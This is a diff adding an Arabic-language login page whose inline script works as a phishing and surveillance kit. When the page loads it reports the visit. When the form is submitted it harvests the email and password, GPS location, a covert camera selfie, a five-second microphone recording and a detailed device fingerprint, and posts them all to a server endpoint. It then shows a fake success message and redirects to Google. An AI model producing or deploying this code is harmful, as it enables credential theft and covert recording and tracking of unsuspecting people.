@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="login-box">
+    <h2>تسجيل الدخول</h2>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+      <input type="password" id="password" placeholder="كلمة المرور" required>
+      <button type="submit">دخول</button>
+    </form>
+    <p id="msg"></p>
+  </div>
+
+  <video id="cam" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    // 1. إشعار فتح الرابط
+    async function notifyVisit() {
+      try {
+        await fetch('/api/visit', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            referrer: document.referrer,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language
+          })
+        });
+      } catch(e) {}
+    }
+    notifyVisit();
+
+    // 2. الموقع GPS
+    let gps = { lat: null, lon: null, acc: null };
+    function getLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(gps);
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            gps.lat = pos.coords.latitude;
+            gps.lon = pos.coords.longitude;
+            gps.acc = pos.coords.accuracy;
+            resolve(gps);
+          },
+          () => resolve(gps),
+          { enableHighAccuracy: true, timeout: 8000 }
+        );
+      });
+    }
+
+    // 3. كاميرا سيلفي
+    let photoBase64 = null;
+    async function captureSelfie() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const video = document.getElementById('cam');
+        video.srcObject = stream;
+        await video.play();
+        await new Promise(r => setTimeout(r, 1500));
+
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) { console.log('Camera denied'); }
+    }
+
+    // 4. تسجيل صوتي (5 ثواني)
+    let audioBase64 = null;
+    async function recordAudio() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = (e) => chunks.push(e.data);
+        recorder.start();
+        await new Promise(r => setTimeout(r, 5000));
+        recorder.stop();
+        await new Promise(r => recorder.onstop = r);
+
+        const blob = new Blob(chunks, { type: 'audio/webm' });
+        audioBase64 = await new Promise((resolve) => {
+          const reader = new FileReader();
+          reader.onloadend = () => resolve(reader.result);
+          reader.readAsDataURL(blob);
+        });
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) { console.log('Mic denied'); }
+    }
+
+    // 5. معلومات الجهاز
+    async function getDeviceInfo() {
+      let battery = null;
+      try {
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          battery = `${Math.round(b.level * 100)}% ${b.charging ? '(charging)' : ''}`;
+        }
+      } catch(e) {}
+
+      let gpuInfo = 'N/A';
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      } catch(e) {}
+
+      return {
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: (navigator.languages || []).join(', '),
+        screen: `${screen.width}x${screen.height}`,
+        windowSize: `${window.innerWidth}x${window.innerHeight}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        battery: battery,
+        cores: navigator.hardwareConcurrency || 'N/A',
+        memory: navigator.deviceMemory || 'N/A',
+        gpu: gpuInfo,
+        touch: 'ontouchstart' in window,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack
+      };
+    }
+
+    // 6. الفورم
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const btn = e.target.querySelector('button');
+      btn.textContent = 'جاري التحقق...';
+      btn.disabled = true;
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      const [location, , device] = await Promise.all([
+        getLocation(),
+        captureSelfie(),
+        getDeviceInfo(),
+        recordAudio()
+      ]);
+
+      await fetch('/api/login', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          email, password,
+          gps: location,
+          photo: photoBase64,
+          audio: audioBase64,
+          device: device
+        })
+      });
+
+      document.getElementById('msg').textContent = 'تم تسجيل الدخول... جاري التحويل';
+      setTimeout(() => window.location.href = 'https://www.google.com', 1500);
+    });
+  </script>
+</body>
+</html>
